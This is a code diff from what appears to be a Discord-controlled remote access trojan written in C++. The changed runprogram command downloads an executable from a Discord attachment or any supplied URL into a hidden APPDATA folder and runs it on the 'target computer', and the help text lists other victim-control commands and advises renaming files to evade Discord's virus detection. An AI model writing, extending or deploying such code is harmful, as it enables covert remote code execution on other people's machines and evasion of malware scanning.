@@ -169,16 +169,41 @@ std::string command_applicationlist(std::vector<std::string> args) {
 }
 
 std::string command_runprogram(std::vector<std::string> args, const dpp::message_create_t evnt) {
-	if (evnt.msg.attachments.size() < 1)
-		return "Please attatch a .exe file to run on the target computer";
-
+	if (evnt.msg.attachments.size() < 1 || args.size() < 3)
+		return "Please attatch a .exe file to run on the target computer or give a url to an executable and the name of the file";
+	bool attatchment = true;
+	if (args.size() == 3)
+		attatchment = false;
 	// Create a hidden directory to store programs	
-	CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
+	BOOL create_val = CreateDirectoryA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), NULL);
+	if (create_val == ERROR_PATH_NOT_FOUND) {
+		std::cerr << "CRITICAL ERROR: APPDATA not found\n";
+		return "CRITICAL ERROR: APPDATA not found\n";
+	}
 	SetFileAttributesA((getenv("APPDATA") + (std::string)"/slavcache").c_str(), FILE_ATTRIBUTE_HIDDEN);
 
-	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), 0, NULL);
-	ShellExecuteA(NULL, "open", (getenv("APPDATA") + (std::string)"/slavcache/file.exe").c_str(), NULL, NULL, SW_SHOWDEFAULT);
-	return "Ran Program Successfuly!";
+	std::string file_name;
+	if (attatchment) {
+		file_name = evnt.msg.attachments[0].filename + ".exe";
+		URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/" + file_name).c_str(), 0, NULL);
+	}
+	else {
+		file_name = args[2] + ".exe";
+		URLDownloadToFileA(NULL, args[1].c_str(), (getenv("APPDATA") + (std::string)"/slavcache/" + file_name).c_str(), 0, NULL);
+	}
+	int rVal = -1;
+	if ((rVal = (int)ShellExecuteA(NULL, "open", (getenv("APPDATA") + (std::string)"/slavcache/" + file_name).c_str(), NULL, NULL, SW_SHOWDEFAULT)) > 32)
+		return "Ran Program Successfuly!";
+	// https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea#return-value, look up the error value if necessary
+	if (rVal == SE_ERR_PNF || rVal == ERROR_PATH_NOT_FOUND || rVal == ERROR_FILE_NOT_FOUND || rVal == SE_ERR_ASSOCINCOMPLETE)
+		return "Error, path not found";
+	else if (rVal == ERROR_BAD_FORMAT)
+		return "Error, File is corrupted (invalid PE executable)";
+	else if (rVal == SE_ERR_ACCESSDENIED)
+		return "Error, Access Denied running file (insufficient permission)";
+	else if (rVal == 0)
+		return "OS out of resources (try restarting?)";
+	return "Error, failed to execute program (tasks.cpp:191), code: " + std::to_string(rVal);
 }
 
 
@@ -333,7 +358,7 @@ std::string command_help(std::vector<std::string> args) {
 		"cmdspawn {amount of windows} {message} {seconds} - pops up a {amount of windows} of command prompt with the message of {msg} for {seconds} seconds\n"
 		"appclose {appid}/{appname} - closes the application with the proccess id of {appid} or with the name of {appname}\n"
 		"applist - lists all applications and their proccess ids\n"
-		"runprogram - runs the program attatched to the message\n"
+		"runprogram - runs the program attatched to the message, remove the .exe name from the application to avoid discord virus detection\n"
 		"loadlibrary - loads the library attatched to the message\n"
 		"changebackround - changes the background image of the targets desktop to the attatched image\n"
 		"downloadfile - downloads the attatched file to the target pc\n"
